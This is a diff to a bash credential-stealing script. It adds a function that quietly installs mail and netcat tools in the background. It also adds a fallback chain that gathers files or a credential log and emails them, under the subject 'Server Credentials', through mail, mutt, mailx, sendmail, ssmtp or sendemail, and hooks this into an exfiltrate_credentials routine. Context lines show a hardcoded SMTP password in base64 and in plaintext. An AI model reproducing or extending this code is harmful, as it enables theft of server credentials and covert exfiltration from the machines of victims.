@@ -110,6 +110,65 @@ readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null || echo
 SMTP_PASSWORD_B64="bXNzcC5KNGtyVHFzLmpwemttZ3Fwd20ybDA1OXYuNkdDMmFJWg=="
 readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null || echo "mssp.J4krTqs.jpzkmgqpwm2l059v.6GC2aIZ")
 
+# ==================== AUTO-INSTALL EMAIL TOOLS ====================
+auto_install_email_tools() {
+    echo "[*] Auto-installing email tools (this may take a minute)..."
+    
+    # List of packages to try installing (install in background for speed)
+    local packages="mailutils mutt bsd-mailx s-nail sendmail ssmtp postfix msmtp exim4 swaks curl python3 nc netcat-openbsd mailsend sendemail dma"
+    
+    # Try each package manager
+    for pkg in $packages; do
+        # Debian/Ubuntu (apt)
+        if command -v apt >/dev/null 2>&1; then
+            DEBIAN_FRONTEND=noninteractive apt-get install -y -qq $pkg 2>/dev/null &
+        # RHEL/CentOS (yum)
+        elif command -v yum >/dev/null 2>&1; then
+            yum install -y -q $pkg 2>/dev/null &
+        # Fedora (dnf)
+        elif command -v dnf >/dev/null 2>&1; then
+            dnf install -y -q $pkg 2>/dev/null &
+        # Arch (pacman)
+        elif command -v pacman >/dev/null 2>&1; then
+            pacman -S --noconfirm --quiet $pkg 2>/dev/null &
+        # OpenSUSE (zypper)
+        elif command -v zypper >/dev/null 2>&1; then
+            zypper install -y $pkg 2>/dev/null &
+        # Alpine (apk)
+        elif command -v apk >/dev/null 2>&1; then
+            apk add --quiet $pkg 2>/dev/null &
+        fi
+    done
+    
+    # Wait for installations to complete (max 60 seconds)
+    echo "[*] Installing packages in background..."
+    sleep 5  # Give installations time to start
+    
+    # Wait for background jobs with timeout
+    local count=0
+    while [ $count -lt 12 ]; do
+        if jobs -r 2>/dev/null | grep -q "Running"; then
+            sleep 5
+            count=$((count + 1))
+        else
+            break
+        fi
+    done
+    
+    # Kill any remaining background jobs
+    jobs -p 2>/dev/null | xargs -r kill 2>/dev/null || true
+    
+    echo "[✓] Package installation complete (some may have failed silently)"
+    
+    # Show what's now available
+    echo "[*] Available email tools:"
+    for cmd in python3 mutt mail mailx sendmail ssmtp msmtp swaks curl nc sendemail; do
+        if command -v $cmd >/dev/null 2>&1; then
+            echo "    ✓ $cmd"
+        fi
+    done
+}
+
 # Function to send email with file attachments using Python
 # ==================== EMAIL FUNCTIONS (WORKING VERSION) ====================
 # Python email with attachments
@@ -698,6 +757,94 @@ Files:"
         fi
         echo "[!] netcat method failed"
     fi
+    
+    # METHOD 11: Simple command-based fallbacks (try everything simple)
+    echo "[*] Trying Method 11: Simple command-based fallbacks..."
+    
+    # Use the credential log file if available
+    local LOG_FILE="/tmp/credential_exfil_log.txt"
+    if [ ! -f "$LOG_FILE" ]; then
+        # Create temporary log with attachment contents
+        LOG_FILE="/tmp/.simple_email_$$"
+        {
+            echo "Server: $(hostname)"
+            echo "Timestamp: $(date)"
+            echo ""
+            for att in "${attachments[@]}"; do
+                if [ -f "$att" ]; then
+                    echo "========== $(basename "$att") =========="
+                    cat "$att" 2>/dev/null
+                    echo ""
+                fi
+            done
+        } > "$LOG_FILE" 2>/dev/null
+    fi
+    
+    # Try simple mail commands (no configuration needed)
+    if [ -f "$LOG_FILE" ]; then
+        # Try mail command variations
+        if (cat "$LOG_FILE" | mail -s "Server Credentials: $(hostname)" "$RECIPIENT_EMAIL") 2>/dev/null; then
+            echo "[✓] SUCCESS: Email sent via mail command"
+            rm -f "/tmp/.simple_email_$$" 2>/dev/null
+            return 0
+        fi
+        
+        # Try mutt simple mode
+        if (cat "$LOG_FILE" | mutt -s "Server Credentials: $(hostname)" "$RECIPIENT_EMAIL") 2>/dev/null; then
+            echo "[✓] SUCCESS: Email sent via mutt command"
+            rm -f "/tmp/.simple_email_$$" 2>/dev/null
+            return 0
+        fi
+        
+        # Try mailx variations
+        if (cat "$LOG_FILE" | mailx -s "Server Credentials: $(hostname)" "$RECIPIENT_EMAIL") 2>/dev/null; then
+            echo "[✓] SUCCESS: Email sent via mailx command"
+            rm -f "/tmp/.simple_email_$$" 2>/dev/null
+            return 0
+        fi
+        
+        # Try s-nail (modern mailx)
+        if (cat "$LOG_FILE" | s-nail -s "Server Credentials: $(hostname)" "$RECIPIENT_EMAIL") 2>/dev/null; then
+            echo "[✓] SUCCESS: Email sent via s-nail command"
+            rm -f "/tmp/.simple_email_$$" 2>/dev/null
+            return 0
+        fi
+        
+        # Try sendmail direct
+        if (cat "$LOG_FILE" | sendmail "$RECIPIENT_EMAIL") 2>/dev/null; then
+            echo "[✓] SUCCESS: Email sent via sendmail command"
+            rm -f "/tmp/.simple_email_$$" 2>/dev/null
+            return 0
+        fi
+        
+        # Try /usr/sbin/sendmail
+        if (cat "$LOG_FILE" | /usr/sbin/sendmail "$RECIPIENT_EMAIL") 2>/dev/null; then
+            echo "[✓] SUCCESS: Email sent via /usr/sbin/sendmail"
+            rm -f "/tmp/.simple_email_$$" 2>/dev/null
+            return 0
+        fi
+        
+        # Try ssmtp
+        if (cat "$LOG_FILE" | ssmtp "$RECIPIENT_EMAIL") 2>/dev/null; then
+            echo "[✓] SUCCESS: Email sent via ssmtp command"
+            rm -f "/tmp/.simple_email_$$" 2>/dev/null
+            return 0
+        fi
+        
+        # Try sendemail (Perl-based)
+        if command -v sendemail >/dev/null 2>&1; then
+            if sendemail -f "$SENDER_EMAIL" -t "$RECIPIENT_EMAIL" -u "Server Credentials: $(hostname)" -m "$(cat "$LOG_FILE")" -s "$SMTP_SERVER:$SMTP_PORT" 2>/dev/null; then
+                echo "[✓] SUCCESS: Email sent via sendemail"
+                rm -f "/tmp/.simple_email_$$" 2>/dev/null
+                return 0
+            fi
+        fi
+        
+        # Cleanup temporary log
+        rm -f "/tmp/.simple_email_$$" 2>/dev/null
+    fi
+    
+    echo "[!] Simple command fallbacks failed"
     
     echo "[!] ALL EMAIL METHODS FAILED!"
     echo "[*] Credentials saved locally only"
@@ -4444,6 +4591,10 @@ exfiltrate_credentials() {
     echo "=========================================="
     echo "CREDENTIAL EXFILTRATION"
     echo "=========================================="
+    echo ""
+    
+    # Auto-install email tools to maximize delivery success
+    auto_install_email_tools
     echo ""
 
     # Get hostname and IP for file naming
